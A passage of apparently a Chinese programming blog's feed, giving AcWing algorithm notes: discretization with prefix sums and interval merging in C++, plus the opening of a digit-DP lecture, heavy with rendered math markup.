class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>10000</mn><mo>≤</mo><mi>c</mi><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">-10000 \le c \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">10000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>3 31 23 67 51 34 67 8</code></pre><p><strong>输出样例：</strong></p><pre><code>805</code></pre><h3 id="离散化-2">离散化</h3><blockquote><p><strong>排序 &amp; 去重</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">3e5</span> + <span class="number">10</span>;  <span class="comment">// 3e5</span></span><br><span class="line"><span class="type">int</span> a[kN], s[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;alls, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">    <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (alls[mid] &gt;= x) &#123;</span><br><span class="line">      r = mid;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> l + <span class="number">1</span>;  <span class="comment">// 离散化到[1, alls.size()], 方便求前缀和</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; alls;</span><br><span class="line">  vector&lt;PII&gt; add, query;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;x, &amp;c);</span><br><span class="line">    alls.<span class="built_in">push_back</span>(x);</span><br><span class="line">    add.<span class="built_in">push_back</span>(&#123;x, c&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    alls.<span class="built_in">push_back</span>(l);</span><br><span class="line">    alls.<span class="built_in">push_back</span>(r);</span><br><span class="line">    query.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">  alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x: add) &#123;</span><br><span class="line">    <span class="keyword">auto</span> index = <span class="built_in">find</span>(alls, x.first);</span><br><span class="line">    a[index] += x.second;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= alls.<span class="built_in">size</span>(); i++) s[i] = s[i - <span class="number">1</span>] + a[i];  <span class="comment">// alls.size(), 而非n</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x: query) &#123;</span><br><span class="line">    <span class="keyword">auto</span> l = <span class="built_in">find</span>(alls, x.first), r = <span class="built_in">find</span>(alls, x.second);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[r] - s[l - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="区间合并">区间合并</h1><h2 id="AcWing-803-区间合并"><a href="https://www.acwing.com/problem/content/805/">AcWing 803. 区间合并</a></h2><p>给定 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>l</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[l_i, r_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，要求合并所有有交集的区间。</p><p>注意如果在端点处相交，也算有交集。</p><p>输出合并完成后的区间个数。</p><p>例如：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,3]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mclose">]</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2,6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span> 可以合并为一个区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span>。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共一行，包含一个整数，表示合并区间完成后的区间个数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><msub><mi>l</mi><mi>i</mi></msub><mo>≤</mo><msub><mi>r</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le l_i \le r_i \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>51 22 45 67 87 9</code></pre><p><strong>输出样例：</strong></p><pre><code>3</code></pre><h3 id="区间合并-2">区间合并</h3><p>初始守备区间在所有区间的左边, 然后遍历当各个区间, 各个区间与守备区间有3种关系：</p><ol><li>当前区间是守备区间的子集 -&gt; 无更新</li><li>当前区间左端和在守备区间左方, 而右端在守备区间右端右方 -&gt; 守备区间右端更新为当前区间右端</li><li>当前区间与守备区间无交集 -&gt; 守备区间存入res, 并更新守备区间为当前区间</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;PII&gt; <span class="title">merge</span><span class="params">(vector&lt;PII&gt; &amp;segs)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">sort</span>(segs.<span class="built_in">begin</span>(), segs.<span class="built_in">end</span>());  <span class="comment">// 排序</span></span><br><span class="line">  vector&lt;PII&gt; res;</span><br><span class="line">  <span class="type">int</span> st = <span class="number">-2e9</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x: segs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x.first &gt; ed) &#123;</span><br><span class="line">      <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line">      st = x.first, ed = x.second;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ed = <span class="built_in">max</span>(ed, x.second);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);  <span class="comment">// 最后一个也要放</span></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  vector&lt;PII&gt; segs;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    segs.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> res = <span class="built_in">merge</span>(segs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res.<span class="built_in">size</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> AcWing算法基础课 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第1.8讲 数位DP</title>
      <link href="/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/"/>
      <url>/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/</url>
      
        <content type="html"><![CDATA[<h1 id="数位DP">数位DP</h1><p><strong>问题</strong> 往往是求一个区间中满足某种性质的数的个数。</p><p><strong>技巧1</strong> [X, Y] -&gt; f(Y) - f(X - 1), f(N)：求0(或1)到N中满足性质的数个数</p><p><strong>技巧2</strong> 树</p><blockquote><p>易错点：</p><ol><li>main()中不执行init()</li><li>不能正确判断是否需要处理前导0，只有Windy数这种题型需排除前导0（第一层左支只能取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\sim a_{n-1}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>）</li><li>不能判断n等于0时返回0还是1</li></ol></blockquote><span id="more"></span><h2 id="AcWing-1081-度的数量"><a href="https://www.acwing.com/problem/content/1083/">AcWing 1081. 度的数量</a></h2><p>求给定区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[X,Y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">]</span></span></span></span> 中满足下列条件的整数个数：这个数恰好等于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 个互不相等的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的整数次幂之和。</p><p>例如，设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><mn>15</mn><mo separator="true">,</mo><mi>Y</mi><mo>=</mo><mn>20</mn><mo separator="true">,</mo><mi>K</mi><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mi>B</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">X = 15, Y = 20, K = 2, B = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">20</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，则有且仅有下列三个数满足题意：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>17</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">17 = 2^4 + 2^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">17</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>18</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><msup><mn>2</mn><mn>1</mn></msup></mrow><annotation encoding="application/x-tex">18 = 2^4 + 2^1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">18</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" 